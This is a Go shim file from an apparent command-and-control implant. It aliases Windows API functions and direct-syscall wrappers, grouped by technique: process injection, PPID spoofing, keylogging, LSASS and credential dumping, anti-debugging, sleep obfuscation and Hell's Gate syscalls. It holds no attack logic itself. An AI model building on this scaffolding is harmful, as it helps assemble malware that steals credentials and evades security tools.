//go:build windows

package main

// Compatibility shim — maps the legacy lowercase names used throughout cmd/agent/
// to the exported symbols now living in implant/syscall (package winsyscall).
//
// This lets all existing technique files compile without mass edits while
// technique code is progressively migrated into the implant/* packages.

import (
	"time"

	"golang.org/x/sys/windows"

	winsyscall "github.com/mjopsec/taburtuaiC2/implant/syscall"
)

// ─── Constants ───────────────────────────────────────────────────────────────

const (
	memCommit            = winsyscall.MemCommit
	memReserve           = winsyscall.MemReserve
	memRelease           = winsyscall.MemRelease
	pageNoAccess         = winsyscall.PageNoAccess
	pageReadWrite        = winsyscall.PageReadWrite
	pageExecRead         = winsyscall.PageExecRead
	pageExecuteReadWrite = winsyscall.PageExecuteReadWrite
	processAllAccess     = winsyscall.ProcessAllAccess
	threadAllAccess      = winsyscall.ThreadAllAccess
	th32csSnapThread     = winsyscall.Th32csSnapThread
	th32csSnapProcess    = winsyscall.Th32csSnapProcess

	extendedStartupInfoPresent       = winsyscall.ExtendedStartupInfoPresent
	procThreadAttributeParentProcess = winsyscall.ProcThreadAttributeParentProcess
	createNewConsole                 = winsyscall.CreateNewConsole

	tokenAllAccess          = winsyscall.TokenAllAccess
	securityImpersonation   = winsyscall.SecurityImpersonation
	tokenTypePrimary        = winsyscall.TokenTypePrimary
	tokenTypeImpersonation  = winsyscall.TokenTypeImpersonation
	logon32LogonInteractive = winsyscall.Logon32LogonInteractive
	logon32ProviderDefault  = winsyscall.Logon32ProviderDefault

	srccopy      = winsyscall.Srccopy
	smCxscreen   = winsyscall.SmCxscreen
	smCyscreen   = winsyscall.SmCyscreen
	dibRGBColors = winsyscall.DibRGBColors
	biRgb        = winsyscall.BiRgb
)

// ─── Type aliases ────────────────────────────────────────────────────────────

type ustring = winsyscall.UString

// hgExportDir aliases the PE export directory struct from the winsyscall package
// for use in technique files that parse PE exports (e.g. threadless injection).
type hgExportDir = winsyscall.HgExportDir

// ─── Module handles ──────────────────────────────────────────────────────────

var (
	modKernel32 = winsyscall.ModKernel32
	modUser32   = winsyscall.ModUser32
	modGdi32    = winsyscall.ModGdi32
	modAdvapi32 = winsyscall.ModAdvapi32
	modNtdll    = winsyscall.ModNtdll
	modDbgHelp  = winsyscall.ModDbgHelp
	modCrypt32  = winsyscall.ModCrypt32
)

// ─── Proc vars ───────────────────────────────────────────────────────────────

var (
	// Injection
	procCreateThread       = winsyscall.ProcCreateThread
	procVirtualAllocEx     = winsyscall.ProcVirtualAllocEx
	procVirtualFreeEx      = winsyscall.ProcVirtualFreeEx
	procWriteProcessMemory = winsyscall.ProcWriteProcessMemory
	procCreateRemoteThread = winsyscall.ProcCreateRemoteThread
	procQueueUserAPC       = winsyscall.ProcQueueUserAPC
	procOpenThread         = winsyscall.ProcOpenThread
	procVirtualProtect     = winsyscall.ProcVirtualProtect

	// Thread/process enumeration
	procCreateToolhelp32Snapshot = winsyscall.ProcCreateToolhelp32Snapshot
	procThread32First            = winsyscall.ProcThread32First
	procThread32Next             = winsyscall.ProcThread32Next
	procProcess32First           = winsyscall.ProcProcess32First
	procProcess32Next            = winsyscall.ProcProcess32Next

	// PPID spoofing
	procInitializeProcThreadAttributeList = winsyscall.ProcInitializeProcThreadAttributeList
	procUpdateProcThreadAttribute         = winsyscall.ProcUpdateProcThreadAttribute
	procDeleteProcThreadAttributeList     = winsyscall.ProcDeleteProcThreadAttributeList

	// Keylogger
	procGetAsyncKeyState = winsyscall.ProcGetAsyncKeyState
	procGetKeyState      = winsyscall.ProcGetKeyState

	// Screenshot (GDI)
	procGetDC                  = winsyscall.ProcGetDC
	procGetWindowDC            = winsyscall.ProcGetWindowDC
	procReleaseDC              = winsyscall.ProcReleaseDC
	procGetDesktopWindow       = winsyscall.ProcGetDesktopWindow
	procGetSystemMetrics       = winsyscall.ProcGetSystemMetrics
	procCreateCompatibleDC     = winsyscall.ProcCreateCompatibleDC
	procCreateCompatibleBitmap = winsyscall.ProcCreateCompatibleBitmap
	procSelectObject           = winsyscall.ProcSelectObject
	procBitBlt                 = winsyscall.ProcBitBlt
	procGetDIBits              = winsyscall.ProcGetDIBits
	procDeleteObject           = winsyscall.ProcDeleteObject
	procDeleteDC               = winsyscall.ProcDeleteDC

	// Token / privilege
	procLogonUser               = winsyscall.ProcLogonUser
	procCreateProcessWithToken  = winsyscall.ProcCreateProcessWithToken
	procImpersonateLoggedOnUser = winsyscall.ProcImpersonateLoggedOnUser
	procRevertToSelf            = winsyscall.ProcRevertToSelf

	// Thread context / hollow / hijack
	procGetThreadContext      = winsyscall.ProcGetThreadContext
	procSetThreadContext      = winsyscall.ProcSetThreadContext
	procSuspendThread         = winsyscall.ProcSuspendThread
	procResumeThread          = winsyscall.ProcResumeThread
	procNtUnmapViewOfSection  = winsyscall.ProcNtUnmapViewOfSection
	procNtCreateSection       = winsyscall.ProcNtCreateSection
	procNtMapViewOfSection    = winsyscall.ProcNtMapViewOfSection
	procLoadLibraryA          = winsyscall.ProcLoadLibraryA
	procGetModuleHandleW      = winsyscall.ProcGetModuleHandleW
	procCreateTimerQueueTimer = winsyscall.ProcCreateTimerQueueTimer
	procDeleteTimerQueueTimer = winsyscall.ProcDeleteTimerQueueTimer
	procQueueUserWorkItem     = winsyscall.ProcQueueUserWorkItem

	// Credential access
	procMiniDumpWriteDump  = winsyscall.ProcMiniDumpWriteDump
	procCryptUnprotectData = winsyscall.ProcCryptUnprotectData
	procRegSaveKeyW        = winsyscall.ProcRegSaveKeyW
	procOpenClipboard      = winsyscall.ProcOpenClipboard
	procCloseClipboard     = winsyscall.ProcCloseClipboard
	procGetClipboardData   = winsyscall.ProcGetClipboardData
	procGlobalLock         = winsyscall.ProcGlobalLock
	procGlobalUnlock       = winsyscall.ProcGlobalUnlock
	procGlobalSize         = winsyscall.ProcGlobalSize

	// HWBP / VEH
	procAddVectoredExceptionHandler    = winsyscall.ProcAddVectoredExceptionHandler
	procRemoveVectoredExceptionHandler = winsyscall.ProcRemoveVectoredExceptionHandler

	// Anti-debug
	procIsDebuggerPresent          = winsyscall.ProcIsDebuggerPresent
	procCheckRemoteDebuggerPresent = winsyscall.ProcCheckRemoteDebuggerPresent
	procNtQueryInformationProcess  = winsyscall.ProcNtQueryInformationProcess
	procGetTickCount64             = winsyscall.ProcGetTickCount64
	procOutputDebugStringW         = winsyscall.ProcOutputDebugStringW

	// Sleep obfuscation (RC4)
	procSystemFunction032 = winsyscall.ProcSystemFunction032

	// NT direct syscall stubs
	procNtProtectVirtualMemory  = winsyscall.ProcNtProtectVirtualMemory
	procNtAllocateVirtualMemory = winsyscall.ProcNtAllocateVirtualMemory
	procNtWriteVirtualMemory    = winsyscall.ProcNtWriteVirtualMemory
	procNtCreateThreadEx        = winsyscall.ProcNtCreateThreadEx

	// LSASS alternative dump techniques
	procRtlReportSilentProcessExit = winsyscall.ProcRtlReportSilentProcessExit
	procNtDuplicateObject          = winsyscall.ProcNtDuplicateObject

	// .NET / CLR hosting
	procCLRCreateInstance = winsyscall.ProcCLRCreateInstance
)

// ─── Hell's Gate aliases ─────────────────────────────────────────────────────

var (
	HellsGateCall = winsyscall.HellsGateCall
	HellsGateSSN  = winsyscall.HellsGateSSN
	hgCString     = winsyscall.HgCString
)

// ─── NT wrapper aliases ──────────────────────────────────────────────────────

var (
	ntAlloc        func(windows.Handle, uintptr, uint32) (uintptr, error)        = winsyscall.NtAlloc
	ntAllocAt      func(windows.Handle, uintptr, uintptr, uint32) (uintptr, error) = winsyscall.NtAllocAt
	ntFree         func(windows.Handle, uintptr)                                 = winsyscall.NtFree
	ntWrite        func(windows.Handle, uintptr, []byte) error                   = winsyscall.NtWrite
	ntProtect      func(windows.Handle, uintptr, uintptr, uint32) (uint32, error) = winsyscall.NtProtect
	ntProtectSelf  func(uintptr, uintptr, uint32) (uint32, error)                = winsyscall.NtProtectSelf
	ntCreateThread func(windows.Handle, uintptr) (windows.Handle, error)         = winsyscall.NtCreateThread
	ntCreateSec    func(uintptr, uint32) (windows.Handle, error)                 = winsyscall.NtCreateSec
	ntMapView      func(windows.Handle, windows.Handle, uintptr, uint32) (uintptr, error) = winsyscall.NtMapView
	ntUnmap        func(windows.Handle, uintptr)                                 = winsyscall.NtUnmap
	ntDelay        func(time.Duration)                                           = winsyscall.NtDelay
)

// ─── Sleep obfuscation aliases ───────────────────────────────────────────────

var (
	sleepObf    func(time.Duration) = winsyscall.SleepObf
	spoofedSleep func(time.Duration) = winsyscall.SpoofedSleep
)
